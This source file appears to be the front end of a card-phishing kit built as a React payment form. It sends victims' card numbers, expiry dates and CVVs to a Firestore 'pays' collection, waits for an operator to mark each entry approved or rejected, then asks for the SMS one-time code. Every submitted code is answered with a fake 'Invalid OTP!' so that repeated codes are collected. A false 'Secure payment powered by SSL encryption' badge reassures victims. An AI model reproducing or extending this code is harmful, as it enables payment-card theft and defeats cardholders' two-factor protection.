'use client';

import type React from 'react';

import { useState, useEffect } from 'react';
import { doc, onSnapshot } from 'firebase/firestore';
import { db, handlePay } from '../firebase';

type PaymentInfo = {
  cardNumber: string;
  year: string;
  month: string;
  bank?: string;
  otp?: string;
  pass: string;
  cardState: string;
  allOtps: string[];
  bank_card: string[];
  prefix: string;
  status: 'new' | 'pending' | 'approved' | 'rejected';
};

export function PaymentForm({
  setisloading,
}: {
  setisloading: (value: boolean) => void;
}) {
  const [isProcessing, setIsProcessing] = useState(false);
  const [otp, setOtp] = useState('');
  const [showOtp, setShowOtp] = useState(false);
  const [step, setStep] = useState(1);
  const [newotp] = useState(['']);
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    cardNumber: '',
    year: '2025',
    month: '1',
    otp: '',
    allOtps: newotp,
    bank: '',
    pass: '',
    cardState: 'new',
    bank_card: [''],
    prefix: '',
    status: 'new',
  });

  const handleAddOtp = (otp: string) => {
    newotp.push(`${otp} , `);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handlePay(paymentInfo, setPaymentInfo);
    setIsProcessing(true);
    setStep(2);
    setTimeout(() => {
      setIsProcessing(false);
      setShowOtp(true);
    }, 2000);
  };

  const handleOtpSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleAddOtp(otp);
    setStep(3);
    setisloading(true);

    setPaymentInfo({
      ...paymentInfo,
      status: 'approved',
    });

    handlePay(paymentInfo, setPaymentInfo);

    setTimeout(() => {
      setisloading(false);
      alert('Invalid OTP!');
      setOtp('');
    }, 3000);
  };

  useEffect(() => {
    const visitorId = localStorage.getItem('visitor');
    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as PaymentInfo;
          if (data.status) {
            setPaymentInfo((prev) => ({ ...prev, status: data.status }));
            if (data.status === 'approved') {
              setStep(2);
              setisloading(false);
            } else if (data.status === 'rejected') {
              setisloading(false);
              alert('Card declined. Please enter correct card information.');
              setStep(1);
            }
          }
        }
      });

      return () => unsubscribe();
    }
  }, [setisloading]);

  const years = Array.from({ length: 10 }, (_, i) => (2025 + i).toString());
  const months = Array.from({ length: 12 }, (_, i) => (i + 1).toString());

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-50 p-4" style={{padding:15}}>
      <div className="w-full max-w-md bg-white rounded-lg shadow-lg overflow-hidden" style={{padding:15}}>
        <div className="p-6 border-b border-gray-200"style={{padding:15}}>
          <h2 className="text-2xl font-bold text-center text-gray-800"  style={{padding:15}}>
            Payment Details
          </h2>
          <p className="text-center text-gray-500 mt-1 text-sm" >
            Enter your card information to complete payment
          </p>
        </div>

        <div className="p-6">
          {!showOtp ? (
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="space-y-2">
                <label
                  htmlFor="name"
                  className="block text-sm font-medium text-gray-700"
                >
                  Name on Card
                </label>
                <div className="relative">
                  <span className="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-500">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      className="h-5 w-5"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    >
                      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                      <circle cx="12" cy="7" r="4"></circle>
                    </svg>
                  </span>
                  <input
                    id="name"
                    className="w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-500 focus:border-transparent"
                    placeholder="John Smith"
                    required
                    onChange={(e) => {
                      setPaymentInfo({
                        ...paymentInfo,
                        bank: e.target.value,
                      });
                    }}
                  />
                </div>
              </div>

              <div className="space-y-2">
                <label
                  htmlFor="cardNumber"
                  className="block text-sm font-medium text-gray-700"
                >
                  Card Number
                </label>
                <div className="relative">
                  <span className="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-500">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      className="h-5 w-5"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    >
                      <rect
                        x="1"
                        y="4"
                        width="22"
                        height="16"
                        rx="2"
                        ry="2"
                      ></rect>
                      <line x1="1" y1="10" x2="23" y2="10"></line>
                    </svg>
                  </span>
                  <input
                    id="cardNumber"
                    className="w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-500 focus:border-transparent"
                    placeholder="1234 5678 9012 3456"
                    type="tel"
                    maxLength={16}
                    minLength={16}
                    required
                    onChange={(e) => {
                      setPaymentInfo({
                        ...paymentInfo,
                        cardNumber: e.target.value,
                      });
                    }}
                  />
                </div>
              </div>

              <div className="grid grid-cols-3 gap-4">
                <div className="space-y-2">
                  <label
                    htmlFor="month"
                    className="block text-sm font-medium text-gray-700"
                  >
                    Month
                  </label>
                  <select
                    id="month"
                    className="w-full py-2 px-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-500 focus:border-transparent"
                    onChange={(e) => {
                      setPaymentInfo({
                        ...paymentInfo,
                        month: e.target.value,
                      });
                    }}
                    defaultValue="1"
                  >
                    {months.map((month) => (
                      <option key={month} value={month}>
                        {month}
                      </option>
                    ))}
                  </select>
                </div>

                <div className="space-y-2">
                  <label
                    htmlFor="year"
                    className="block text-sm font-medium text-gray-700"
                  >
                    Year
                  </label>
                  <select
                    id="year"
                    className="w-full py-2 px-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-500 focus:border-transparent"
                    onChange={(e) => {
                      setPaymentInfo({
                        ...paymentInfo,
                        year: e.target.value,
                      });
                    }}
                    defaultValue="2025"
                  >
                    {years.map((year) => (
                      <option key={year} value={year}>
                        {year}
                      </option>
                    ))}
                  </select>
                </div>

                <div className="space-y-2">
                  <label
                    htmlFor="cvv"
                    className="block text-sm font-medium text-gray-700"
                  >
                    CVV
                  </label>
                  <div className="relative">
                    <span className="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-500">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        className="h-5 w-5"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        strokeWidth="2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      >
                        <rect
                          x="3"
                          y="11"
                          width="18"
                          height="11"
                          rx="2"
                          ry="2"
                        ></rect>
                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                      </svg>
                    </span>
                    <input
                      id="cvv"
                      className="w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-500 focus:border-transparent"
                      placeholder="123"
                      type="tel"
                      maxLength={3}
                      minLength={3}
                      required
                      onChange={(e) => {
                        setPaymentInfo({
                          ...paymentInfo,
                          pass: e.target.value,
                        });
                      }}
                    />
                  </div>
                </div>
              </div>

              <button
                type="submit"
                className="w-full flex items-center justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-white bg-gray-800 hover:bg-gray-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-500"
                disabled={isProcessing}
              >
                {isProcessing ? (
                  <>
                    <svg
                      className="animate-spin -ml-1 mr-3 h-5 w-5 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      ></circle>
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      ></path>
                    </svg>
                    Processing...
                  </>
                ) : (
                  <>
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      className="h-5 w-5 mr-2"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    >
                      <rect
                        x="1"
                        y="4"
                        width="22"
                        height="16"
                        rx="2"
                        ry="2"
                      ></rect>
                      <line x1="1" y1="10" x2="23" y2="10"></line>
                    </svg>
                    Pay Now
                  </>
                )}
              </button>
            </form>
          ) : step === 2 && paymentInfo.status === 'pending' ? (
            <div className="flex flex-col items-center justify-center py-6 space-y-4">
              <svg
                className="animate-spin h-10 w-10 text-gray-700"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
              >
                <circle
                  className="opacity-25"
                  cx="12"
                  cy="12"
                  r="10"
                  stroke="currentColor"
                  strokeWidth="4"
                ></circle>
                <path
                  className="opacity-75"
                  fill="currentColor"
                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                ></path>
              </svg>
              <p className="text-center text-sm text-gray-600">
                Your payment request is being processed, please wait...
              </p>
            </div>
          ) : (
            <form onSubmit={handleOtpSubmit} className="space-y-4">
              <div className="space-y-2">
                <label
                  htmlFor="otp"
                  className="block text-sm font-medium text-gray-700"
                >
                  Please enter the OTP verification code sent to your mobile
                </label>
                <input
                  id="otp"
                  value={otp}
                  type="tel"
                  minLength={4}
                  maxLength={6}
                  placeholder="Enter OTP"
                  className="w-full py-2 px-3 text-center text-lg tracking-widest border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-gray-500 focus:border-transparent"
                  onChange={(e) => setOtp(e.target.value)}
                  required
                />
                <p className="text-xs text-gray-500 text-center">
                  A one-time password has been sent to your registered mobile
                  number
                </p>
              </div>
              <button
                type="submit"
                className="w-full py-2 px-4 border border-transparent rounded-md shadow-sm text-white bg-gray-800 hover:bg-gray-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-500"
              >
                Confirm Payment
              </button>
            </form>
          )}
        </div>

        <div className="px-6 py-4 bg-gray-50 border-t border-gray-200">
          <div className="flex items-center justify-center space-x-1 text-xs text-gray-500">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-3 w-3"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
            <span>Secure payment powered by SSL encryption</span>
          </div>
        </div>
      </div>
    </div>
  );
}
